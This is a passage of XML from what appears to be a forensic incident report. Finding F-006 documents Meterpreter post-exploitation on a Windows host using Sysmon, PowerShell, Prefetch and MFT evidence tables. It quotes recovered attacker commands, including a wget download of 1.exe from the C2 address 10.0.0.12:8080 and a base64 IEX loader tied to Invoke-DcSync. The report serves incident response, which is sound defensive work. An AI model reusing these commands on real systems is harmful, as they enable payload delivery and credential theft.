              <w:t>evtxecmd/evtxecmd_0.csv#18635</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-006: Meterpreter post-exploitation from injected explorer.exe: discovery commands (tracert, quser, tasklist), PowerShell extension (MSFConsole host, Invoke-DcSync) and download of 1.exe from 10.0.0.12:8080</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artifact:prefetch</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-powershell%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-sysmon%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:windows powershell.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>discovery / execution / command and control</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1016, T1033, T1057, T1059.001, T1059.003, T1105</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2023-11-10 11:04:13.885211 → 2023-11-10 11:11:23.852357</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Sysmon EID 1: 11:04:13.885 cmd.exe PID 6600 {e6e9f951-0e2d-654e-9101-000000000500} parent explorer.exe 7324 {…9001…} (RecordID 310); children of cmd 6600: 'tracert  -h' 11:04:39 {e6e9f951-0e47-654e-9301-…} (311), 'tracert  -m 6 8.8.8.8' 11:05:01 {…0e5d-654e-9401…} (312), 'tracert  -h 6 8.8.8.8' 11:05:12 {…0e68-654e-9501…} (313), 'quser' 11:05:41 PID 7752 {…0e85-654e-9601…} (314). Windows PowerShell 400/600/800 at 11:06:40 with HostName=MSFConsole, HostApplication=explorer.exe; PS/Operational 4104 at 11:06:40.890 'IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("…Add-WebTransport…")))' and script blocks defining Invoke-DcSync / Invoke-DcSyncAll / Invoke-DcSyncHashDump (RecordIDs 68–77; Hayabusa/Chainsaw/Zircolite 'Malicious PowerShell Commandlets', 'Uncommon PowerShell Hosts', 'Suspicious Non PowerShell WSMAN COM Provider'). Sysmon EID 1: 11:09:06 cmd.exe PID 5848 {e6e9f951-0f52-654e-ad01-000000000500} parent explorer 7324 {…9001…} (331); 11:09:10 'powershell' PID 736 {e6e9f951-0f56-654e-af01-000000000500} parent cmd 5848 (332); 4104 11:10:55 'wget http://10.0.0.12:8080/1.exe -o 1.exe' (RecordID 129); Sysmon EID 11 11:10:55.603 C:\Users\medmondson\1.exe created by powershell 736 (335); Sysmon EID 3 (336) powershell 736 10.0.0.124:50009 → 10.0.0.12:8080/tcp; 11:11:23 'tasklist' PID 8012 {e6e9f951-0fdb-654e-ba01-000000000500} parent cmd 5848 (337). Prefetch: TRACERT.EXE run 3 (11:04:39, 11:05:01, 11:05:12), QUSER.EXE 11:05:41, TASKLIST.EXE 11:11:23. $MFT: C:\Users\medmondson\1.exe entry 90508, 986,624 bytes, created 11:10:55.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The cmd.exe children of the injected explorer.exe correspond to Meterpreter 'shell' channels; the MSFConsole host inside explorer.exe is the Meterpreter PowerShell extension (load powershell), whose bootstrap code includes the DcSync helper functions (their presence does not prove DcSync was executed; the host is a workgroup machine). Situational awareness: tracert (network path), quser (logged-on users), tasklist (processes). 1.exe has the same size as pscp.exe; no Prefetch, Amcache, Sysmon EID 1 or 4104 execution evidence for 1.exe was found, so it appears downloaded but not executed (Sysmon was active at the time). C2 IP 10.0.0.12 is confirmed for payload hosting (port 8080); no Sysmon EID 3 exists for pscp.exe/explorer 7324 itself, so the Meterpreter session port is not established at this stage (to pivot in SRUM / other sources).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (17)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11:04:13.885211</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\system32\cmd.exe</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 6600, ProcessGUID: e6e9f951-0e2d-654e-9101-000000000500 | RuleName: - | MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18 | ParentProcess: C:\Windows\ex</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18655</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:04:39.859949</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>tracert  -h</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 2764, ProcessGUID: e6e9f951-0e47-654e-9301-000000000500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evtxecmd/evtxecmd_0.csv#18656</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:05:01.056649</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>tracert  -m 6 8.8.8.8</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 7720, ProcessGUID: e6e9f951-0e5d-654e-9401-000000000500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evtxecmd/evtxecmd_0.csv#18657</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:05:12.550053</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>tracert  -h 6 8.8.8.8</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 2180, ProcessGUID: e6e9f951-0e68-654e-9501-000000000500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evtxecmd/evtxecmd_0.csv#18658</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:05:41.182379</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>quser</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 7752, ProcessGUID: e6e9f951-0e85-654e-9601-000000000500 | RuleName: - | MD5=3147F9B0C7089DD698778246E835C494,SHA256=6EE15E5B1311D501FBDAA15C9D1197BA2F99745EA5ABB3E724D598EE53D48A6E,IMPHASH=EA8421BD383CD44D7C13D5BBB67DDFA5 | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18659</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:09:06.424384</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\system32\cmd.exe</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 5848, ProcessGUID: e6e9f951-0f52-654e-ad01-000000000500 | RuleName: - | MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18 | ParentProcess: C:\Windows\ex</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18676</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:09:10.219150</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>powershell</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 736, ProcessGUID: e6e9f951-0f56-654e-af01-000000000500 | RuleName: - | MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481 | ParentProcess: C:\Windows\Sys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18677</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:10:55.607209</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736, ProcessGUID: e6e9f951-0f56-654e-af01-000000000500 | RuleName: EXE | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | TargetFilename: C:\Users\medmondson\1.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18680</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</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r>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:11:23.852357</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>tasklist</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 8012, ProcessGUID: e6e9f951-0fdb-654e-ba01-000000000500 | RuleName: - | MD5=80036C62EACEEFAC7F7DF133634321F5,SHA256=9F60240830FAF4DE590360561A6E249F5D0C41FF8AFBB9498BBE5C1A80ABD02C,IMPHASH=DCE1F3B1BD09BBAD166CE65677E33EDB | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18682</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</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11:06:40.853693</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Windows PowerShell 400 | PowerShell | Engine state is changed from None to Available | HostApplication=explorer.exe</w:t>
              <w:br/>
              <w:t xml:space="preserve"> | HostName=MSFConsole</w:t>
              <w:br/>
              <w:t xml:space="preserve"> | HostVersion=0.1</w:t>
              <w:br/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#28055</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Windows PowerShell.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:06:40.890383</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IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("DQpmdW5jdGlvbiBBZGQtV2ViVHJhbnNwb3J0IHsNCiAgPCMNCiAgICAuU1lOT1BTSVMNCiAgICAgIEFkZCBhIHdlYi1iYXNlZCB0cmFuc3BvcnQgKGh0dHAvcykgdG8gdG</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#8744</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:04:39.853697</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, previous)</w:t>
              <w:br/>
              <w:t>TRACERT.EXE</w:t>
              <w:br/>
              <w:t>runs=3 hash=EC2ABA23 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#196</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\TRACERT.EXE-EC2ABA23.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:05:41.181847</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>QUSER.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=FE15F6D2 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#99</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\QUSER.EXE-FE15F6D2.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
